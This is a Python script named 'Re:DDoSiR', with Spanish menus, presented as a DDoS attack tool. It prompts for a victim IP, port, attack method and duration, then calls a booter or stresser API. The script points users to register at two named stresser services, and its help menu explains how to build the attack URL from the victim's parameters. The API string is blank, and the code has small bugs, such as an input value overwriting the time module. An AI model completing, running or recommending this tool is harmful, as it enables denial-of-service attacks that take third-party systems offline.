
#!/usr/bin/python3
#Copyright 2020 tools_DDos
#Escrito by Osososo
#GitHub:https://github.com/oscarsanchezt

BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RESET = '\033[39m'

from colorama import init
init()

#INICIO 

print(RED+"")
print(" ██▀███  ▓█████   ▓█████▄ ▓█████▄  ▒█████    ██████  ██▓ ██▀███   ")
print("▓██ ▒ ██▒▓█   ▀ █ ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ ▓██▒▓██ ▒ ██▒ ")
print("▓██ ░▄█ ▒▒███     ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   ▒██▒▓██ ░▄█ ▒ ")
print("▒██▀▀█▄  ▒▓█  ▄ █ ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒░██░▒██▀▀█▄   ")
print("░██▓ ▒██▒░▒████▒  ▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒░██░░██▓ ▒██▒ ")
print("░ ▒▓ ░▒▓░░░ ▒░ ░░ ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░▓  ░ ▒▓ ░▒▓░ ")
print("  ░▒ ░ ▒░ ░ ░  ░  ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░ ▒ ░  ░▒ ░ ▒░ ")
print("  ░░   ░    ░    ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░   ▒ ░  ░░   ░  ")
print("   ░        ░  ░   ░       ░        ░ ░        ░   ░     ░      ")
print("                 ░       ░                                      ")
print(RESET+"")                                                                                                         
print(CYAN+"            ⚠ Welcome to DDOS tool by Osososo⚠")
print(RESET+"                  Para Cancelar Ctrl + c ")
print("")

import os, time, requests, webbrowser

# Funciones 

def borrarpant():
    if os.name == "nt":
        os.system ("clear")
    else:
        os.system ("clear")

def intro():
    print(""" [1] ATTACK DDoS
 [2] Salir
 [3] Mirar mi GitHub
 [4] Conseguir la API
 [5] Como usar DDoS""")

## Fin funciones

#Bucle 

while True:
    print(BLUE+"> SELECCIONE UNA OPCION: ")
    print(RESET+"")
    intro()
    print("")
    atacar = input("> Opcion seleccionada: ")
    if atacar == "1":
        borrarpant()
        print(RED+"⌬ DANGER: INICIANDO PROGRAMA DE ATAQUE...")
        time.sleep(2)
        print(RESET+"     -INICIADO CORRECTAMENTE-")
        print("")
        time.sleep(1)
        ip = input("> IP VICTIMA: ")
        port = input("> PUERTO: ")
        method = input("> METODO DE ATAQUE: ")
        time = input("> TIEMPO: ")

        #conc = input("Write how much concurrents: ")
        r = requests.get("") ## <<< Ingrese tu API

        print("DANGER, ATTACK ON...")
        print("Thanks for using Re:DDoSiR by Osososo. Exiting in 10 seconds...")
        import time
        time.sleep(10)
        quit()
    elif atacar == "2":
        print(YELLOW+"  SALIENDO DE Re:DDoS...")
        time.sleep(2)
        quit()
    elif atacar == "3":
        webbrowser.open("https://github.com/oscarsanchezt")
    if atacar == "4":
        borrarpant()
        print(RED+"⌬ Cargando solucion API...")
        time.sleep(3)
        borrarpant()
        print(RESET+"")
        print("Si tu problema es este:")
        print("")
        print(RED+ "◉ traceback (most recent call last) file re:DDoSiR.py, line 71 in <module> r = requests.get()<<< ingrese tu api ◉")
        print("")
        print(RESET+"Es porque te falta la API, Para conseguir la API es tan senzillo como registrate en una de estas paginas web.")
        print("")
        api = input(MAGENTA+"> OPCION 1 o 2: ")
        if api =="1":
            webbrowser.open("https://zeus-net.pro/panel/register.php")
        elif api =="2":
            webbrowser.open("https://topstresser.io/register.php")
            quit()
    if atacar =="5":
        borrarpant()
        print(RED+"⌬ Cargando contenido...")
        print(RESET+"")
        time.sleep(3)
        print("Una vez que tengas tu API, tendras que abrir el .py con nano usando el comando")
        print("")
        print(YELLOW+"◉ En la seccion de requests en la parte de las comillas meteras el https de la api, fuera de las comillas pondras +ip+&port=+port+&time=+time+&method=+method+ ◉")
        print("")
        print(RESET+"Si no lo entendeis ,os subire unas capturas de pantalla donde viene mas graficamente")
        print("")
        print("")
        quit()



